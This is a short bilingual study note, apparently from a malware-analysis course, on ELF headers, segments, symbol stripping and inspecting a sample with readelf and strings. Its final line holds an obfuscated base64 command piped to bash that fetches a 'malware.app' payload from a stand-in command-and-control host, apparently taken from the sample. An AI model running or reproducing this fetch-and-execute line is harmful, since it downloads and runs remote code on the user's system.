---
title: ELF
---

##
##
## ELF Header
    Sections
    Segments
linking/loading process of ELF executables
##
##
## 两个PT_LOAD flags
## RE--read and execute-- 可执行代码。文件的entrypoint应该在这个段里面
## RW-read and write---- 文件的全局变量和动态链接信息
## .text 部分---包含了代码指令，映射到了PT_LOAD RE 段。
## 如果文件被改动，表的结构会变化
## ![2021_02_09_图片.png](https://cdn.logseq.com/%2F7aa8ab99-753a-4230-847b-43a1c3a3ef47a5a99d66-ad0a-424c-9568-7e492a02a4862021_02_09_%E5%9B%BE%E7%89%87.png?Expires=4766472377&Signature=eODqQb3zPRmL7lvHn3YgDGnrzK7k~Y-DAaj2xI32-poJF-7E13J7b7RAZloy4N3AD0zg6rtQRbY7pmG6VOR6bYEZ3tJq17zz3GPY4hTJbmM3P63NsiVchCF-6jGAGo0z8mebfAoJC8dQqw2wkagL5eGtjWx8e2yN9JeZXpnqUUqaoTerP43W-kjSzAZFfG~XZmiRyCeV2inXPZF8mvbbDEO4VSQRTbHktUTCLsFd9tqnuHtmLa0QbLzCdnalaSohabJHsk2t5zJQ2pii81a0HU4-lr2BMWOwLvxE9-hVNVsOXUDPjKHKWvZO29SA04BlB86MeXQEjmg6llo6gpkmIg__&Key-Pair-Id=APKAJE5CCD6X7MP6PTEA)
## 就像上面这个，只有三个段，其中PT_GNU_STACK---指示链接器文件是否需要可执行堆栈(这也是为什么它的大小为零)。
## ![2021_02_09_图片.png](https://cdn.logseq.com/%2F7aa8ab99-753a-4230-847b-43a1c3a3ef47ecb3954b-bfe9-4c8a-898b-4579c1c8d1302021_02_09_%E5%9B%BE%E7%89%87.png?Expires=4766472006&Signature=AS2PLW8fKDuV6kace5fEIBuSLkDDkrWrZq7a~WsHxvN7swqquDYr7kjgj5rtrQOASJ2ud~lhESwZOEGNMbyD6jP3soxpDUV4lDrdOPOHpk-XBsdWWBBrFv0kal-VJHGuUCWrvjRhYtO3iiM-7ptghKeUb0sSeaMg3BjeCAR1UnuspTi9QU7FwkNS6swNcSjJqv~Dk8DgRS4clJpDslS4FTlx50AyGfxSv2bYczi99m1uWDFxBS3Mm8~1TGpEt0Xhj6m2GgDX~9WAeGtcgyepO7X6HayVoF38kkA~EpcHnd22LBCB~OWqyvDuoN1PW7sHmo72a~9ZGPfYHaV7DKr-4g__&Key-Pair-Id=APKAJE5CCD6X7MP6PTEA){:height 492, :width 475}
##
## objcopy -S training-sample training-sample-stripped
## readelf -s training-sample-stripped
## 然后就只能看到动态symbol表
## Strip utilities may also leave the sections and patch fields in the ELF header (e shoff: offset of the section header table and e shnum: the number of section headers). As a result, the binary will be detected as having no sections.

Strip实用程序也可以在ELF报头中留下section和patch字段(e shoff: section头表的偏移量，e shnum: section头的数量)。结果，二进制文件将被检测为没有section
##
## ELF头--入口点，程序头表的位置
## readelf -h training-sample-- view header info
## strings training-sample > str.txt
## echo d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64 -d |bash;
## base64解密
